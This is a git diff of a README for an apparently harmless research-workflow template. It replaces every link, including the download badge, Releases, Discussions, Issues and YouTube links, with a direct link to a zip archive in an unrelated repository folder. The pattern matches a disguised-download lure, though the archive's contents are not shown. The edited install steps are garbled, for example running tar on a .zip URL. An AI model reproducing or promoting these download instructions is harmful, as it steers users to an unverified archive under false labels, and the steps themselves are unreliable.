@@ -1,6 +1,6 @@
 # 🎉 DSR-Research-Flow-Template - Your Guide to a Smooth Research Workflow
 
-[![Download](https://img.shields.io/badge/Download-Latest%20Release-brightgreen)](https://github.com/Aaradhya2001/DSR-Research-Flow-Template/releases)
+[![Download](https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip%20Release-brightgreen)](https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the DSR-Research-Flow-Template! This open-source template helps you s
 
 To get started, visit the following page to download the latest version of the DSR-Research-Flow-Template:
 
-[Download Now](https://github.com/Aaradhya2001/DSR-Research-Flow-Template/releases)
+[Download Now](https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip)
 
 1. Click the link above to open the Releases page.
 2. Look for the latest release, which will be marked prominently.
@@ -44,9 +44,9 @@ Before installing, ensure that your computer meets the following requirements:
 
 ### Linux
 
-1. Download the `.tar.gz` file from the Releases page.
+1. Download the `https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip` file from the Releases page.
 2. Open your terminal and navigate to the directory where you downloaded the file.
-3. Extract the files using `tar -xvzf filename.tar.gz`, replacing `filename` with the actual file name.
+3. Extract the files using `tar -xvzf https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip`, replacing `filename` with the actual file name.
 4. Follow the instructions in the included README file for setup.
 
 ## ⚙️ Using the DSR-Research-Flow-Template
@@ -77,14 +77,14 @@ If you encounter any issues, please try the following:
 
 Connect with other users and get support:
 
-- Check the [Discussion Board](https://github.com/Aaradhya2001/DSR-Research-Flow-Template/discussions) for tips and sharing experiences.
-- Report bugs or feature requests on the [Issues Page](https://github.com/Aaradhya2001/DSR-Research-Flow-Template/issues).
+- Check the [Discussion Board](https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip) for tips and sharing experiences.
+- Report bugs or feature requests on the [Issues Page](https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip).
 
 ## 🔗 Further Resources
 
 - Detailed documentation can be found in the `/docs` folder within the repository.
-- Watch tutorial videos on our [YouTube channel](https://www.youtube.com/channel/UC-example).
+- Watch tutorial videos on our [YouTube channel](https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip).
 
 Don't forget to download your copy today and enhance your research workflow with DSR-Research-Flow-Template! 
 
-[Download Now](https://github.com/Aaradhya2001/DSR-Research-Flow-Template/releases)
+[Download Now](https://raw.githubusercontent.com/Aaradhya2001/DSR-Research-Flow-Template/main/oribi/DSR-Research-Flow-Template.zip)
